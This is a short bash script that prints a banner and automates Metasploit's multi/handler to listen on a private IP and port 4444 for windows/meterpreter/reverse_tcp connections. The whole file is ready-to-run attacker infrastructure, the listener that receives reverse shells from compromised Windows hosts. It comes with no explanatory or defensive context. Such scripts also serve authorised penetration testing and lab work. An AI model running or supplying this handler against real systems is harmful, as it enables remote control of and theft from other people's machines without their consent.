#!/bin/bash

# Set the payload and connection details as variables
PAYLOAD="windows/meterpreter/reverse_tcp"
LHOST="192.168.1.124"
LPORT="4444"

echo "
███████╗██████╗ ██╗      ██████╗ ██╗████████╗
██╔════╝██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝
███████╗██████╔╝██║     ██║   ██║██║   ██║   
╚════██║██╔═══╝ ██║     ██║   ██║██║   ██║   
███████║██║     ███████╗╚██████╔╝██║   ██║   
╚══════╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝   
Loading Metasploit and Setting up the Handler
Using PAYLOAD: $PAYLOAD
Using LHOST: $LHOST
Using LPORT: $LPORT
"

# Start msfconsole and automate the setup for Windows payloads
msfconsole -q -x "
use exploit/multi/handler;
set payload $PAYLOAD;
set LHOST $LHOST;
set LPORT $LPORT;
run -j -z;
"
